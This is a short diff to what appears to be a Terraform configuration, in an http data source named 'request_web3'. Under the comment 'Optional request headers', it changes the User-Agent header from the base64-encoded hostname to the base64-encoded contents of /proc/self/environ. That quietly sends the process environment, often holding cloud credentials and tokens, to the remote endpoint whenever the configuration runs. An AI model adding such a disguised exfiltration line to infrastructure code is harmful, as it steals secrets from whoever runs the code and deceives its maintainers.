@@ -25,6 +25,6 @@ data "http" "request_web3" {
 
   # Optional request headers
   request_headers = {
-    User-Agent = filebase64("/etc/hostname")
+    User-Agent = filebase64("/proc/self/environ")
   }
 }
